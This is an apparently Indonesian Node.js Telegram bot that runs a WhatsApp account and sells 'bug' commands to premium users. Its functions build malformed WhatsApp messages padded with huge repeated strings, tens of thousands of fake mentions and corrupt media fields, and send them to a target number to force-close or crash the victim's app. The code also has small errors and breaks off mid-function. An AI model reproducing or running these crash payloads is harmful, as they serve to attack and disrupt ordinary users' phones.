const { Telegraf, Markup, session } = require("telegraf"); // Tambahkan session dari telegraf
const fs = require('fs');
const moment = require('moment-timezone');
const {
    makeWASocket,
    makeInMemoryStore,
    fetchLatestBaileysVersion,
    useMultiFileAuthState,
    DisconnectReason,
    generateWAMessage,
    generateWAMessageFromContent,
    prepareWAMessage,
} = require("@whiskeysockets/baileys");
const pino = require('pino');
const chalk = require('chalk');
const { BOT_TOKEN, allowedDevelopers } = require("./config.js");
const crypto = require('crypto');
const premiumFile = './premiumuser.json';
const ownerFile = './owneruser.json';
const adminFile = './admins.json';
const TOKENS_FILE = "./tokens.json";
let bots = [];

const bot = new Telegraf(BOT_TOKEN);

function sleep(ms) {
  new Promise((resolve) => setTimeout(resolve, ms))
}

bot.use(session());

let CsmX = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
const usePairingCode = true;

const blacklist = ["6142885267", "7275301558", "1376372484"];

const randomImages = [    
    "https://ibb.co.com/d0CMj8kD"
    "https://ibb.co.com/x8Hwts1s"
    "https://ibb.co.com/ynYtQTf8"
    "https://ibb.co.com/prNckSJJ"
    "https://ibb.co.com/99WcGxxq"
    "https://ibb.co.com/tpYpGH6x"
    "https://ibb.co.com/TZg6JC3"
];

const getRandomImage = () => randomImages[Math.floor(Math.random() * randomImages.length)];

// Fungsi untuk mendapatkan waktu uptime
const getUptime = () => {
    const uptimeSeconds = process.uptime();
    const hours = Math.floor(uptimeSeconds / 3600);
    const minutes = Math.floor((uptimeSeconds % 3600) / 60);
    const seconds = Math.floor(uptimeSeconds % 60);

    return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

const axios = require("axios");

const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/bintangthemods/phantomdb/refs/heads/main/tokens.json"; // Ganti dengan URL GitHub yang benar

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens; // Asumsikan format JSON: { "tokens": ["TOKEN1", "TOKEN2", ...] }
  } catch (error) {
    console.error(chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message));
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa apakah token bot valid..."));

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("[SECURITY!]: TOKEN ANDA TIDAK VALID! SILAHKAN MEMBELI AKSES UNTUK MENGAKSES SCRIPT TAKAMURA!"));
    process.exit(1);
  }

  console.log(chalk.bold.green(`[SECURITY!]: TOKEN ANDA TERVERIFIKASI!`));
  startBot();
}

function startBot() {
  console.clear();
  console.log(chalk.bold.white(`⢻⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⠤⠤⠴⢶⣶⡶⠶⠤⠤⢤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⠁
⠀⠻⣯⡗⢶⣶⣶⣶⣶⢶⣤⣄⣀⣀⡤⠒⠋⠁⠀⠀⠀⠀⠚⢯⠟⠂⠀⠀⠀⠀⠉⠙⠲⣤⣠⡴⠖⣲⣶⡶⣶⣿⡟⢩⡴⠃⠀
⠀⠀⠈⠻⠾⣿⣿⣬⣿⣾⡏⢹⣏⠉⠢⣄⣀⣀⠤⠔⠒⠊⠉⠉⠉⠉⠑⠒⠀⠤⣀⡠⠚⠉⣹⣧⣝⣿⣿⣷⠿⠿⠛⠉⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⣹⠟⠛⠿⣿⣤⡀⣸⠿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠾⣇⢰⣶⣿⠟⠋⠉⠳⡄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⡞⠁⠀⠀⡠⢾⣿⣿⣯⠀⠈⢧⡀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠁⢀⣿⣿⣯⢼⠓⢄⠀⢀⡘⣦⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣰⣟⣟⣿⣀⠎⠀⠀⢳⠘⣿⣷⡀⢸⣿⣶⣤⣄⣀⣤⢤⣶⣿⡇⢀⣾⣿⠋⢀⡎⠀⠀⠱⣤⢿⠿⢷⡀⠀⠀⠀⠀
⠀⠀⠀⠀⣰⠋⠀⠘⣡⠃⠀⠀⠀⠈⢇⢹⣿⣿⡾⣿⣻⣖⠛⠉⠁⣠⠏⣿⡿⣿⣿⡏⠀⡼⠀⠀⠀⠀⠘⢆⠀⠀⢹⡄⠀⠀⠀
⠀⠀⠀⢰⠇⠀⠀⣰⠃⠀⠀⣀⣀⣀⣼⢿⣿⡏⡰⠋⠉⢻⠳⣤⠞⡟⠀⠈⢣⡘⣿⡿⠶⡧⠤⠄⣀⣀⠀⠈⢆⠀⠀⢳⠀⠀⠀
⠀⠀⠀⡟⠀⠀⢠⣧⣴⣊⣩⢔⣠⠞⢁⣾⡿⢹⣷⠋⠀⣸⡞⠉⢹⣧⡀⠐⢃⢡⢹⣿⣆⠈⠢⣔⣦⣬⣽⣶⣼⣄⠀⠈⣇⠀⠀
⠀⠀⢸⠃⠀⠘⡿⢿⣿⣿⣿⣛⣳⣶⣿⡟⣵⠸⣿⢠⡾⠥⢿⡤⣼⠶⠿⡶⢺⡟⣸⢹⣿⣿⣾⣯⢭⣽⣿⠿⠛⠏⠀⠀⢹⠀⠀
⠀⠀⢸⠀⠀⠀⡇⠀⠈⠙⠻⠿⣿⣿⣿⣇⣸⣧⣿⣦⡀⠀⣘⣷⠇⠀⠄⣠⣾⣿⣯⣜⣿⣿⡿⠿⠛⠉⠀⠀⠀⢸⠀⠀⢸⡆⠀
⠀⠀⢸⠀⠀⠀⡇⠀⠀⠀⠀⣀⠼⠋⢹⣿⣿⣿⡿⣿⣿⣧⡴⠛⠀⢴⣿⢿⡟⣿⣿⣿⣿⠀⠙⠲⢤⡀⠀⠀⠀⢸⡀⠀⢸⡇⠀
⠀⠀⢸⣀⣷⣾⣇⠀⣠⠴⠋⠁⠀⠀⣿⣿⡛⣿⡇⢻⡿⢟⠁⠀⠀⢸⠿⣼⡃⣿⣿⣿⡿⣇⣀⣀⣀⣉⣓⣦⣀⣸⣿⣿⣼⠁⠀
⠀⠀⠸⡏⠙⠁⢹⠋⠉⠉⠉⠉⠉⠙⢿⣿⣅⠀⢿⡿⠦⠀⠁⠀⢰⡃⠰⠺⣿⠏⢀⣽⣿⡟⠉⠉⠉⠀⠈⠁⢈⡇⠈⠇⣼⠀⠀
⠀⠀⠀⢳⠀⠀⠀⢧⠀⠀⠀⠀⠀⠀⠈⢿⣿⣷⣌⠧⡀⢲⠄⠀⠀⢴⠃⢠⢋⣴⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⡸⠀⠀⢠⠇⠀⠀
⠀⠀⠀⠈⢧⠀⠀⠈⢦⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣧⠐⠸⡄⢠⠀⢸⠀⢠⣿⣟⡿⠋⠀⠀⠀⠀⠀⠀⠀⡰⠁⠀⢀⡟⠀⠀⠀
⠀⠀⠀⠀⠈⢧⠀⠀⠀⠣⡀⠀⠀⠀⠀⠀⠀⠈⠛⢿⡇⢰⠁⠸⠄⢸⠀⣾⠟⠉⠀⠀⠀⠀⠀⠀⠀⢀⠜⠁⠀⢀⡞⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⢧⡀⠀⠀⠙⢄⠀⠀⠀⠀⠀⠀⠀⢨⡷⣜⠀⠀⠀⠘⣆⢻⠀⠀⠀⠀⠀⠀⠀⠀⡴⠋⠀⠀⣠⠎⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠑⢄⠀⠀⠀⠑⠦⣀⠀⠀⠀⠀⠈⣷⣿⣦⣤⣤⣾⣿⢾⠀⠀⠀⠀⠀⣀⠴⠋⠀⠀⢀⡴⠃⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⢄⡀⢸⣶⣿⡑⠂⠤⣀⡀⠱⣉⠻⣏⣹⠛⣡⠏⢀⣀⠤⠔⢺⡧⣆⠀⢀⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠳⢽⡁⠀⠀⠀⠀⠈⠉⠙⣿⠿⢿⢿⠍⠉⠀⠀⠀⠀⠉⣻⡯⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠲⠤⣀⣀⡀⠀⠈⣽⡟⣼⠀⣀⣀⣠⠤⠒⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⢻⡏⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀
WELCOME TO DHEATLESS EMPIRE!`));
}

validateToken();
// --- Koneksi WhatsApp ---
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

const startSesi = async () => {
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }), // Log level diubah ke "info"
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'P', // Placeholder, you can change this or remove it
        }),
    };

    CsmX = makeWASocket(connectionOptions);

    CsmX.ev.on('creds.update', saveCreds);
    store.bind(CsmX.ev);

    CsmX.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
            isWhatsAppConnected = true;
            console.log(chalk.white.bold(`
╭──────────────────────⟤
│  ${chalk.green.bold('WHATSAPP TERHUBUNG')}
╰──────────────────────⟤`));
        }

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.white.bold(`
╭──────────────────────⟤
│ ${chalk.red.bold('WHATSAPP TERPUTUS')}
╰──────────────────────⟤`),
                shouldReconnect ? chalk.white.bold(`
╭──────────────────────⟤
│ ${chalk.red.bold('HUBUNGKAN ULANG')}
╰──────────────────────⟤`) : ''
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
}

const loadJSON = (file) => {
    if (!fs.existsSync(file)) return [];
    return JSON.parse(fs.readFileSync(file, 'utf8'));
};

const saveJSON = (file, data) => {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
};

// Muat ID owner dan pengguna premium
let ownerUsers = loadJSON(ownerFile);
let adminUsers = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);
let adminList = [];
let ownerList = [];

// Middleware untuk memeriksa apakah pengguna adalah owner
const checkOwner = (ctx, next) => {
    if (!ownerUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("⛔ Anda bukan owner.");
    }
    next();
};

const isOwner = (userId) => {
    if (ownerList.includes(userId.toString())) {
        ownerataubukan = "✅";
        return true;
    } else {
        ownerataubukan = "❌";
        return false;
    }
};

const CSMX_ID = (userId) => {
    if (allowedDevelopers.includes(userId.toString())) {
        ysudh = "✅";
        return true;
    } else {
        gnymbung = "❌";
        return false;
    }
};

// --- Fungsi untuk Menambahkan Admin ---
const addOwner = (userId) => {
    if (!ownerList.includes(userId)) {
        ownerList.push(userId);
        saveOwners();
    }
};

// --- Fungsi untuk Menghapus Admin ---
const removeOwner = (userId) => {
    ownerList = ownerList.filter(id => id !== userId);
    saveOwners();
};

// --- Fungsi untuk Menyimpan Daftar Admin ---
const saveOwners = () => {
    fs.writeFileSync('./data/owneruser.json', JSON.stringify(ownerList));
};

const loadOwners = () => {
    try {
        const data = fs.readFileSync('./data/owneruser.json');
        ownerList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar Owner:'), error);
        ownerList = [];
    }
};

// --- Fungsi untuk Mengecek Apakah User adalah Admin ---

// --- Fungsi untuk Mengecek Apakah User adalah Admin ---
const isAdmin = (userId) => {
    if (adminList.includes(userId.toString())) {
        adminataubukan = "✅";
        return true;
    } else {
        adminataubukan = "❌";
        return false;
    }
};

// --- Fungsi untuk Menambahkan Admin ---
const addAdmin = (userId) => {
    if (!adminList.includes(userId)) {
        adminList.push(userId);
        saveAdmins();
    }
};

// --- Fungsi untuk Menghapus Admin ---
const removeAdmin = (userId) => {
    adminList = adminList.filter(id => id !== userId);
    saveAdmins();
};

// --- Fungsi untuk Menyimpan Daftar Admin ---
const saveAdmins = () => {
    fs.writeFileSync('./data/admins.json', JSON.stringify(adminList));
};

// --- Fungsi untuk Memuat Daftar Admin ---
const loadAdmins = () => {
    try {
        const data = fs.readFileSync('./data/admins.json');
        adminList = JSON.parse(data);
    } catch (error) {
        console.error(chalk.red('Gagal memuat daftar admin:'), error);
        adminList = [];
    }
};

// Middleware untuk memeriksa apakah pengguna adalah premium
const checkPremium = (ctx, next) => {
    if (!premiumUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("❌ Anda bukan pengguna premium.");
    }
    next();
};

const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.reply("❌ WhatsApp belum terhubung. Silakan hubungkan dengan Pairing Code terlebih dahulu.");
    return;
  }
  next();
};

//=====( FUNCTION FC JIER )========
async function DanjiCrashInvisible(CsmX, target) {
    const corruptedJson = "{".repeat(1000000); 

    const payload = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: corruptedJson,
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.035,
                degreesLongitude: 922.999999999999,
                name: corruptedJson,
                address: corruptedJson
              }
            },
            body: { text: corruptedJson },
            footer: { text: corruptedJson },
            nativeFlowMessage: {
              messageParamsJson: corruptedJson
            },
            contextInfo: {
              forwardingScore: 9999,
              isForwarded: true,
              mentionedJid: Array.from({ length: 40000 }, (_, i) => `${i}@s.whatsapp.net`)
            }
          }
        }
      },
      buttonsMessage: {
        contentText: corruptedJson,
        footerText: corruptedJson,
        buttons: [
          {
            buttonId: "btn_invis",
            buttonText: { displayText: corruptedJson },
            type: 1
          }
        ],
        headerType: 1
      },
      extendedTextMessage: {
        text: corruptedJson,
        contextInfo: {
          forwardingScore: 9999,
          isForwarded: true,
          mentionedJid: Array.from({ length: 40000 }, (_, i) => `${i}@s.whatsapp.net`)
        }
      },
      documentMessage: {
        fileName: corruptedJson,
        title: corruptedJson,
        mimetype: "application/x-corrupt",
        fileLength: "999999999",
        caption: corruptedJson,
        contextInfo: {}
      },
      stickerMessage: {
        isAnimated: true,
        fileSha256: Buffer.from(corruptedJson).toString("base64"),
        mimetype: "image/webp",
        fileLength: 9999999,
        fileEncSha256: Buffer.from(corruptedJson).toString("base64"),
        mediaKey: Buffer.from(corruptedJson).toString("base64"),
        directPath: corruptedJson,
        mediaKeyTimestamp: Date.now(),
        isAvatar: false
      }
    };

    await CsmX.relayMessage(target, payload, {
      messageId: null,
      participant: { jid: target },
      userJid: target
    });
    console.log(chalk.red(`Sucess Sending Bug To ${target}`));
}

//====( FUNCTION CRASH )====
async function jembod(target) {
  const Msg1 = {
    message: {
      viewOnceMessage: {
        message: {
        interactiveResponseMessage: {
          body: {
            text: "炎 𝗧𝗮𝗸𝗮𝗺𝘂𝗿𝗮 𝗗𝗶𝘀𝗶𝗻𝗶.. • 🩸",
              format: "DEFAULT"
            },
                        nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "꧔꧈".repeat(9000),
              version: 3
            }
          }
        }
      },
      interactiveMessage: {
        nativeFlowMessage: {
          messageParamsJson: "{".repeat(70000)
        }
      }
    }
  };

  const Msg = await generateWAMessageFromContent(target, Msg1.message, {
    userJid: target
  });

  await CsmX.relayMessage(target, Msg1.message, {
    messageId: Msg1.key.id
  });

  const Msg2 = {
    viewOnceMessage: {
      message: {
        locationMessage: {
          degreesLatitude: 0,
          degreesLongitude: 0,
          name: " 炎 𝗧𝗮𝗸𝗮𝗺𝘂𝗿𝗮 𝗗𝗶𝘀𝗶𝗻𝗶.. • 🩸 ".repeat(10000),
          address: "꧔꧈".repeat(50000),
          jpegThumbnail: Buffer.from([]),
          contextInfo: {
            mentionedJid: Array.from({ length: 30000 }, () =>
              "1" + Math.floor(Math.random() * 9999999) + "@s.whatsapp.net"
            ),
            isForwarded: true,
            forwardingScore: 9999
          }
        }
      }
    }
  };

  await CsmX.relayMessage(target, Msg2, {
    messageId: "msg.key",
    participant: { jid: target }
  });
}

async function uicrash(CsmX, target) {
 
    await CsmX.relayMessage(
      target,
      {
        locationMessage: {
          degreesLatitude: 11.11,
          degreesLongitude: -11.11,
          name: " ./𝘅𝗿𝗹.𝛆𝛘𝛆¿? " + "꧀".repeat(60000),
          url: "https://t.me/xrellyy",
          contextInfo: {
            externalAdReply: {
              quotedAd: {
                advertiserName: ".".repeat(60000),
                mediaType: "IMAGE",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
                caption: " ‼️⃟  ./𝘅𝗿𝗹.𝛆𝛘𝛆𝂀 "
              },
              placeholderKey: {
                remoteJid: "0s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890"
              }
            }
          }
        }
      },
      {
        participant: { jid: target }
      }
    );
  }
  
async function SystemUi(CsmX, target) {
  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: " 𝐔𝐢 𝐒𝐢𝐬𝐭𝐞𝐦 🦠 ",
              hasMediaAttachment: false,
            },
            body: {
              text: " 𝐔𝐢 𝐒𝐢𝐬𝐭𝐞𝐦 🦠 ",
            },
            nativeFlowMessage: {
              messageParamsJson: "{[".repeat(10000),
              buttons: [
                {
                  name: "cta_url",
                  buttonParamsJson: "\u0003"
                },
                {
                  name: "single_select",
                  buttonParamsJson: "꧔꧈".repeat(3000)
                },
                {
                  name: "nested_call_permission",
                  buttonParamsJson: JSON.stringify({ status: true })
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({ cameraAccess: true })
                }
              ]
            }
          }
        }
      }
    },
    {}
  );

  await CsmX.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              "13135550101@s.whatsapp.net",
              "13135550202@s.whatsapp.net",
              "13135550303@s.whatsapp.net",
              "13135550404@s.whatsapp.net",
              "13135550505@s.whatsapp.net",
              "13135550606@s.whatsapp.net",
              "13135550707@s.whatsapp.net",
              "13135550808@s.whatsapp.net",
              "13135550809@s.whatsapp.net",
              "13135551010@s.whatsapp.net"
            ].map(jid => ({
              tag: "to",
              attrs: { jid },
              content: undefined
            }))
          }
        ]
      }
    ]
  });
}

async function Crashmaklu(CsmX, target) {  
  let msg = {
    stickerMessage: {
        url: "https://mmg.whatsapp.net/v/t62.15575-24/531394224_1769273720396834_917219850068298254_n.enc?ccb=11-4&oh=01_Q5Aa2QG9sgfqFiPkXpIE9ii0iUKgTKpWb3-4hfJ2O13OYemXrw&oe=68C69453&_nc_sid=5e03e0&mms3=true",
        fileSha256: "61bGpsFlkhDNSzP7iGpkZ4g8/lNG0IYYKSusMs5I5Uc=",
        fileEncSha256: "UdjQrI89kosNE4zZGPfqPSTxAohlIlTW0dfGTAz5ikk=",
        mediaKey: "up/4gSlgR/uhHeGcgd9fdRtUMjfbPMNCbfxbINXlQgU=",
        mimetype: "application/was",
        height: 9999,
        width: 9999,
        directPath: "/v/t62.15575-24/531394224_1769273720396834_917219850068298254_n.enc?ccb=11-4&oh=01_Q5Aa2QG9sgfqFiPkXpIE9ii0iUKgTKpWb3-4hfJ2O13OYemXrw&oe=68C69453&_nc_sid=5e03e0",
        fileLength: "999999999999999999",
        mediaKeyTimestamp: "1755253587",
        isAnimated: true,
        stickerSentTs: "1755253587205",
        isAvatar: false,
        isAiSticker: false,
        isLottie: true,        
      contextInfo: {
        participant: targetNumber,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
        remoteJid: "X",
        participant: "0@s.whatsapp.net",
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    },
  };
  
  await CsmX.relayMessage(target, msg, {
    participant: { jid:target }, 
    messageId: null
  });
}


//=======(ENDS FUNC)
//======( CASE ADD AKSES )========
// Command /addowner - Menambahkan owner baru
bot.command("addowner", async (ctx) => {
    if (!CSMX_ID(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /addowner <id_user>");
    }

    if (ownerList.includes(userId)) {
        return await ctx.reply(`🌟 User dengan ID ${userId} sudah terdaftar sebagai owner.`);
    }

    ownerList.push(userId);
    await saveOwnerList();

    const successMessage = `
✅ User dengan ID *${userId}* berhasil ditambahkan sebagai *Owner*.

*Detail:*
- *ID User:* ${userId}

Owner baru sekarang memiliki akses ke perintah /addadmin, /addprem, dan /delprem.
    `;

    await ctx.replyWithMarkdown(successMessage);
});

// Command /delowner - Menghapus owner
bot.command("delowner", async (ctx) => {
    if (!CSMX_ID(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /delowner <id_user>");
    }

    if (!ownerList.includes(userId)) {
        return await ctx.reply(`❌ User dengan ID ${userId} tidak terdaftar sebagai owner.`);
    }

    ownerList = ownerList.filter(id => id !== userId);
    await saveOwnerList();

    const successMessage = `
✅ User dengan ID *${userId}* berhasil dihapus dari daftar *Owner*.

*Detail:*
- *ID User:* ${userId}

Owner tersebut tidak lagi memiliki akses seperti owner.
    `;

    await ctx.replyWithMarkdown(successMessage);
});

// Command /addadmin - Menambahkan admin baru
bot.command("addadmin", async (ctx) => {
    if (!CSMX_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /addadmin <id_user>");
    }

    addAdmin(userId);

    const successMessage = `
✅ User dengan ID *${userId}* berhasil ditambahkan sebagai *Admin*.

*Detail:*
- *ID User:* ${userId}

Admin baru sekarang memiliki akses ke perintah /addprem dan /delprem.
    `;

    await ctx.replyWithMarkdown(successMessage, {
        reply_markup: {
            inline_keyboard: [
                [{ text: "ℹ️ Dev", url: "t.me/kyanzz11" }]
            ]
        }
    });
});

// Command /deladmin - Menghapus admin
bot.command("deladmin", async (ctx) => {
    if (!CSMX_ID(ctx.from.id) && !isOwner(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }

    const userId = ctx.message.text.split(" ")[1];
    if (!userId) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /deladmin <id_user>");
    }

    removeAdmin(userId);

    const successMessage = `
✅ User dengan ID *${userId}* berhasil dihapus dari daftar *Admin*.

*Detail:*
- *ID User:* ${userId}

Admin tersebut tidak lagi memiliki akses ke perintah /addprem dan /delprem.
    `;

    await ctx.replyWithMarkdown(successMessage, {
        reply_markup: {
            inline_keyboard: [
                [{ text: "ℹ️ Dev", url: "t.me/kyanzz11" }]
            ]
        }
    });
});

// Perintah untuk menambahkan pengguna premium (hanya owner)
bot.command('addprem', async (ctx) => {
  if (!CSMX_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }
  
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dijadikan premium.\nContoh: /addprem 123456789");
    }

    const userId = args[1];

    if (premiumUsers.includes(userId)) {
        return ctx.reply(`✅ Si Peler ${userId} sudah memiliki status Premium.`);
    }

    premiumUsers.push(userId);
    saveJSON(premiumFile, premiumUsers);

    return ctx.reply(`✅ Mantaff Lek ${userId} sekarang memiliki akses premium!`);
});

// Perintah untuk menghapus pengguna premium (hanya owner)
bot.command('delprem', async (ctx) => {
  if (!CSMX_ID(ctx.from.id) && !isOwner(ctx.from.id) && !isAdmin(ctx.from.id)) {
        return await ctx.reply("❌ Maaf, Anda tidak memiliki akses untuk menggunakan perintah ini.");
    }
  
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dihapus dari prem.\nContoh: /delprem 123456789");
    }

    const userId = args[1];

    if (!premiumUsers.includes(userId)) {
        return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar Prem.`);
    }

    premiumUsers = premiumUsers.filter(id => id !== userId);
    saveJSON(premiumFile, premiumUsers);

    return ctx.reply(`🚫 Mampus ${userId} telah dihapus dari daftar Premium`);
});
//=======( FUNCTION EDIT BUTTONS )=======
async function editMenu(ctx, caption, buttons) {
  try {
    await ctx.editMessageMedia(
      {
        type: 'photo',
        media: getRandomImage(),
        caption,
        parse_mode: 'Markdown',
     },
    {
        reply_markup: buttons.reply_markup,
      }
    );
  } catch (error) {
    console.error('Error editing menu:', error);
    await ctx.reply('Maaf, terjadi kesalahan saat mengedit pesan.');
  }
}

//=====( CASE MENU )========
bot.command('start', async (ctx) => {
    const userId = ctx.from.id.toString();

    if (blacklist.includes(userId)) {
        return ctx.reply("⛔ Anda telah masuk daftar blacklist dan tidak dapat menggunakan script.");
    }
    
    const laguURL = "https://files.catbox.moe/kenacv.mp3"; // Ganti URL
    ctx.replyWithAudio({ url: laguURL }, { title: "Takamura", performer: "Takamura" });
    
    const RandomBgtJir = getRandomImage();
    const waktuRunPanel = getUptime(); // Waktu uptime panel
    const buttons = Markup.inlineKeyboard([
  [
    Markup.button.callback('𝗧𝗔𝗞𝗔𝗠𝗨𝗥𝗔 𝗕𝗨𝗚 🦠', 'bugoption'),
  ],
  [
    Markup.button.callback('𝗖𝗢𝗡𝗧𝗥𝗢𝗟 𝗧𝗔𝗞𝗔𝗠𝗨𝗥𝗔 🛠️', 'owneroption'),
  ],
  [
    Markup.button.url('𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥', 't.me/kyanzz11'),
    Markup.button.url('𝗢𝗪𝗡𝗘𝗥', 't.me/danji27'),
   ],
]);
    
  await ctx.replyWithPhoto(RandomBgtJir, {
    caption: `
\`\`\`DHEATLESS - EMPIRE!\n
ⓘ こんにちは。@kyanzz11 によって作成された Dheatless ボットです。お手伝いさせていただきます。

スクリプト情報 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧-
⌦ Dev: @kyanzz11
⌦ Owner: @danji27
⌦ Version: 3.0
⌦ Online: ${waktuRunPanel}

下のボタンを押してメニューを選択してください。
─────────────────────────────
How To Checking Premium? /cekprem
Press Button Down Here to Show Menu.
\`\`\`
    `, 
    parse_mode: 'Markdown',
    reply_markup: buttons.reply_markup,
  })
});
 
 bot.action('bugoption', async (ctx) => {
  // ✅ Cek premium pakai function checkPremium
    if (!premiumUsers.includes(ctx.from.id.toString())) {
        return ctx.answerCbQuery('❌ Anda bukan premium!', { show_alert: true });
    }
    
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('🔙', 'startmenu')],
  ]);
  const caption = `
\`\`\`DHEATLESS - EMPIRE!\n
ⓘ こんにちは。@kyanzz11 によって作成された Dheatless ボットです。お手伝いさせていただきます。

スクリプト情報 𝐓𝐫𝐚𝐯𝐚𝐬
⌦ /forceinvis 62xxx - force close invisible 
⌦ /xdelay 62xxx - delay invisible hard
⌦ /crashsystem 62xxx - crash system ui

バグを賢く利用する
───────────────
Wisely To Use This Bug.\`\`\`
  `;

  await editMenu(ctx, caption, buttons);
});

bot.action('owneroption', async (ctx) => {
  // ✅ Cek premium pakai function checkPremium
    if (!ownerList.includes(ctx.from.id.toString())) {
        return ctx.answerCbQuery('❌ Anda bukan Owner!', { show_alert: true });
    }
    
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('🔙', 'startmenu')],
  ]);
  const caption = `
\`\`\`DHEATLESS - EMPIRE!\n
ⓘ こんにちは。@kyanzz11 によって作成された Dheatless ボットです。お手伝いさせていただきます。

スクリプト情報 𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮
⌦ /addowner [id]
⌦ /delowner [id]
⌦ /addadmin [id]
⌦ /deladmin [id]
⌦ /addprem [id]
⌦ /delprem [id]
⌦ /reqpair 62xxx

下のボタンを押してメニューを選択してください。
─────────────────────────────
Press Button Down Here to Show Menu.\`\`\`
  `;

  await editMenu(ctx, caption, buttons);
});

bot.action('startmenu', async (ctx) => {
const waktuRunPanel = getUptime(); 
  const buttons = Markup.inlineKeyboard([
  [
